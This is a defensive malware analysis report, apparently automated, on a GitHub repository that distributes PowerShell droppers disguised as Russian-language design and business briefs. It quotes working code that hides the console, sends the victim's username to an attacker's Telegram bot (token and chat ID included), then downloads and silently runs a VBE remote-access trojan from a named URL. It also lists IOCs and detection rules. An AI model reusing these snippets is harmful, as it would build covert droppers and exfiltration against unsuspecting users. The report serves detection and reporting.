# Security Analysis Report - needtocheck Repository

## ⚠️ CRITICAL WARNING: MALWARE DETECTED ⚠️

This repository contains **MALICIOUS SOFTWARE** (malware) designed to compromise systems. **DO NOT EXECUTE ANY FILES FROM THIS REPOSITORY.**

## Executive Summary

This repository contains a sophisticated malware distribution system disguised as legitimate business documents. The malware employs social engineering tactics, remote access trojans (RAT), and credential theft mechanisms.

**Threat Level:** CRITICAL  
**Classification:** Remote Access Trojan (RAT), Information Stealer  
**Distribution Method:** Social Engineering via fake business documents

---

## Repository Structure

```
needtocheck/
├── ps1/                          # PowerShell malware scripts
│   ├── ego.ps1                   # Business presentation TZ lure
│   ├── fifia.ps1                 # Construction company TZ lure
│   ├── gogo.ps1                  # Cat breeder business card lure
│   ├── kira.ps1                  # Accounting tasks lure
│   ├── kisa.ps1                  # Cafe logo TZ lure
│   ├── meow.ps1                  # OZON product cards TZ lure
│   ├── torch.ps1                 # Bakery logo TZ lure
│   └── var.ps1                   # Dog kennel TZ lure
├── SCRRC4ryuk.vbe                # VBE encrypted RAT payload
├── TelegramWorker.scr            # .NET executable disguised as screensaver
├── WmiPrvSE.scr                  # .NET executable disguised as screensaver
├── defendnot-loader.exe          # PE32+ malware loader
├── defendnot.dll                 # PE32+ malicious DLL
├── gedion.scr                    # PE32 executable disguised as screensaver
├── install.exe                   # .NET installer executable
├── photo.jpg                     # Legitimate image (1440x1024 JPEG)
└── wallpaper.ps1                 # Wallpaper changer script
```

---

## Malware Analysis

### 1. Attack Vector: Social Engineering

All PowerShell scripts (ps1/*.ps1) follow an identical multi-stage attack pattern:

#### Stage 1: Concealment
```powershell
# Hide PowerShell window using Windows API
Add-Type -Name Window -Namespace Console -MemberDefinition '...'
[Console.Window]::ShowWindow($consolePtr, 0)
```

#### Stage 2: Decoy Document
Each script creates a legitimate-looking text file with business-related content:
- **ego.ps1**: Design brief for company presentations (Russian text)
- **fifia.ps1**: Construction project technical specification
- **gogo.ps1**: Business card design for cat breeder
- **kira.ps1**: Accounting department tasks
- **kisa.ps1**: Cafe logo design brief
- **meow.ps1**: Product card specifications for OZON marketplace
- **torch.ps1**: Bakery logo design specifications
- **var.ps1**: Dog kennel logo technical requirements

The decoy documents are opened automatically to distract the victim while malicious operations occur in the background.

#### Stage 3: Data Exfiltration
```powershell
# Send notification to attacker's Telegram bot
$Token = "8263447327:AAH2UWtHaUU0i_3OmxK7mzmRLTK8MfsWzSk"
$ChatID = "7063407604"
$CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$Message = "The user's shortcut was enabled for user: $CurrentUser"
```

**Compromised Credentials:**
- Telegram Bot Token: `8263447327:AAH2UWtHaUU0i_3OmxK7mzmRLTK8MfsWzSk`
- Telegram Chat ID: `7063407604`

This notifies the attacker that a victim has been successfully infected, including their Windows username.

#### Stage 4: Delayed Payload Delivery
```powershell
# Wait 444 seconds (7.4 minutes) to evade detection
Start-Sleep -Seconds 444

# Download and execute RAT payload
$Url = "https://github.com/Mafin111/MafinREP111/raw/refs/heads/main/SCRRC4ryuk.vbe"
$FileName = "ryuk.vbe"
$LocalAppData = [Environment]::GetFolderPath("LocalApplicationData")
$DownloadPath = Join-Path $LocalAppData $FileName

$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile($Url, $DownloadPath)

# Execute hidden
$processInfo = New-Object System.Diagnostics.ProcessStartInfo
$processInfo.FileName = $DownloadPath
$processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
$processInfo.CreateNoWindow = $true
[System.Diagnostics.Process]::Start($processInfo) | Out-Null
```

### 2. RAT Payload: SCRRC4ryuk.vbe

- **File Type:** VBScript Encoded (VBE) file
- **Purpose:** Second-stage Remote Access Trojan
- **Name Reference:** "Ryuk" - named after the Ryuk ransomware family
- **Source:** Downloads from `https://github.com/Mafin111/MafinREP111/`
- **Storage Location:** `%LocalAppData%\ryuk.vbe`
- **Execution:** Hidden, no window displayed

### 3. Binary Executables

#### Screensaver Files (.scr)
- **TelegramWorker.scr** - .NET executable (9 KB)
- **WmiPrvSE.scr** - .NET executable (25 KB)  
  - Disguised as Windows WMI Provider Host process
- **gedion.scr** - PE32 executable (2.6 MB)

All use the `.scr` extension to appear as Windows screensavers, but are malicious executables.

#### Malware Components
- **defendnot-loader.exe** (595 KB) - PE32+ x86-64 loader
  - Name suggests anti-defense/anti-detection functionality
- **defendnot.dll** (437 KB) - PE32+ x86-64 DLL
  - Likely contains evasion and defense bypass code
- **install.exe** (12 KB) - .NET installer

### 4. Wallpaper Script (wallpaper.ps1)

Less malicious but still suspicious:
```powershell
# Downloads image from attacker's repository
$imageUrl = "https://github.com/Mafin111/MafinREP111/raw/refs/heads/main/photo.jpg"
$imagePath = "C:\Users\Public\wallpaper.jpg"

# Forces wallpaper change via Windows API
[Wallpaper]::SystemParametersInfo(20, 0, $imagePath, 0x01 -bor 0x02)
```

This script changes the victim's desktop wallpaper, potentially for intimidation or as a distraction tactic.

---

## Indicators of Compromise (IOCs)

> **Important Note:** The credentials and infrastructure details listed below belong to the malware operators (attackers). They are intentionally provided in full for:
> - Security operations center (SOC) detection and blocking
> - Threat intelligence sharing
> - Reporting to service providers (Telegram, GitHub)
> - Law enforcement investigation and prosecution
> - Creating accurate detection signatures and firewall rules

### Network Indicators

**Command & Control:**
- Telegram Bot API: `api.telegram.org`
- Telegram Bot Token: `8263447327:AAH2UWtHaUU0i_3OmxK7mzmRLTK8MfsWzSk` (attacker's infrastructure)
- Telegram Chat ID: `7063407604` (attacker's chat)

**Malware Distribution:**
- Repository: `https://github.com/Mafin111/MafinREP111/`
- Payload URL: `https://github.com/Mafin111/MafinREP111/raw/refs/heads/main/SCRRC4ryuk.vbe`
- Image URL: `https://github.com/Mafin111/MafinREP111/raw/refs/heads/main/photo.jpg`

### File System Indicators

**Dropped Files:**
- `%LocalAppData%\ryuk.vbe`
- `%LocalAppData%\<decoy_document_name>.txt` (varies by script)
- `C:\Users\Public\wallpaper.jpg`

**Malicious Files (in repository):**
- All `.ps1` files in `ps1/` directory
- `SCRRC4ryuk.vbe`
- `*.scr` files
- `defendnot-loader.exe`
- `defendnot.dll`
- `install.exe`
- `wallpaper.ps1`

### Behavioral Indicators

1. PowerShell execution with hidden windows
2. Outbound connections to Telegram API
3. Downloads from GitHub repositories
4. Hidden process execution
5. Delayed execution (444 second sleep)
6. File creation in %LocalAppData%
7. System API calls for window manipulation
8. Desktop wallpaper modification

---

## Attack Chain Summary

```
[Initial Execution] 
    ↓
[Hide PowerShell Window]
    ↓
[Create & Open Decoy Document] ← Social Engineering
    ↓
[Exfiltrate Username to Telegram] ← Data Theft
    ↓
[Wait 444 seconds] ← Anti-Detection
    ↓
[Download ryuk.vbe RAT] ← Payload Delivery
    ↓
[Execute RAT Hidden] ← System Compromise
    ↓
[Persistent Access Established]
```

---

## Malware Capabilities

Based on the code analysis:

1. **Information Stealing**
   - Windows username collection
   - System information gathering
   - Potential for credential theft (RAT payload)

2. **Remote Access**
   - RAT installation (ryuk.vbe)
   - Command & Control via Telegram
   - Backdoor persistence

3. **Evasion Techniques**
   - Hidden window execution
   - Delayed payload delivery (7.4 minutes)
   - Disguised as legitimate files (.scr extensions)
   - Social engineering with business documents
   - Silent error handling (empty catch blocks)

4. **System Manipulation**
   - Desktop wallpaper modification
   - Hidden process creation
   - File system modification

---

## Target Profile

**Geographic:** Russian-speaking countries (all text content in Russian)  
**Sector:** Small businesses, freelancers, designers  
**Distribution Method:** Likely via:
- Email attachments (fake job offers, design briefs)
- Compressed archives (.zip, .rar)
- File sharing platforms
- Social media direct messages

**Social Engineering Themes:**
- Design work (logos, business cards, presentations)
- Business documentation
- Accounting tasks
- Marketplace product management

---

## Recommendations

### For Security Teams

1. **Immediate Actions:**
   - Block all network IOCs listed above
   - Scan systems for file IOCs
   - Monitor for Telegram API connections with the specified bot token
   - Report the malicious GitHub repository: `Mafin111/MafinREP111`
   - Report the Telegram bot to Telegram abuse

2. **Detection Rules:**
   ```
   - Monitor for: PowerShell + ShowWindow API calls
   - Monitor for: Downloads from github.com/Mafin111/*
   - Monitor for: Connections to api.telegram.org with user data
   - Monitor for: .vbe file execution
   - Monitor for: .scr file execution from user directories
   - Monitor for: Files named "ryuk.vbe"
   ```

3. **User Education:**
   - Warn about fake design/business document lures
   - Train users to recognize suspicious file extensions
   - Emphasize verification of sender identity

### For Repository Owner

This repository should be:
1. **Immediately removed** or archived
2. **Reported to GitHub** as containing malware
3. All files should be **deleted permanently**

### For General Users

**If you have executed any files from this repository:**

1. **Immediately disconnect from the network**
2. **Run a full antivirus/anti-malware scan**
3. **Check for:**
   - Files in %LocalAppData% (especially ryuk.vbe)
   - Unusual PowerShell processes
   - Unexpected network connections
4. **Change all passwords** from a clean system
5. **Consider full system reinstallation** for critical/sensitive systems
6. **Report the incident** to your IT security team

---

## Legal Notice

This analysis is provided for **educational and defensive security purposes only**. The analyzed code constitutes malware designed to:
- Gain unauthorized access to computer systems
- Steal personal information
- Establish persistent backdoors
- Evade security controls

Such activities violate:
- Computer Fraud and Abuse Act (CFAA) in the United States
- Computer Misuse Act in the United Kingdom  
- Similar cybercrime laws in most jurisdictions

**Distribution, execution, or use of this malware is illegal and unethical.**

---

## Attribution

**Attacker Infrastructure:**
- GitHub Account: `Mafin111`
- Telegram Bot: `8263447327:AAH2UWtHaUU0i_3OmxK7mzmRLTK8MfsWzSk`
- Telegram Chat: `7063407604`

This information should be reported to:
- GitHub Trust & Safety
- Telegram Abuse Team
- Law Enforcement (if applicable)

---

## Analysis Metadata

**Repository:** maxturbaman/needtocheck  
**Analysis Date:** 2026-01-04  
**Analyst:** Automated Security Analysis  
**Classification:** Malware Repository  
**Threat Type:** Remote Access Trojan (RAT), Information Stealer  
**Severity:** CRITICAL

---

## Conclusion

This repository is a **complete malware distribution kit** targeting Russian-speaking users through social engineering. The malware:

1. Uses sophisticated social engineering (fake business documents)
2. Employs anti-detection techniques (delays, hidden execution)
3. Establishes C2 via Telegram
4. Downloads and executes a RAT payload (Ryuk variant)
5. Provides persistent remote access to compromised systems

**This repository should be quarantined, reported, and removed immediately.**

**DO NOT EXECUTE ANY FILES FROM THIS REPOSITORY UNDER ANY CIRCUMSTANCES.**
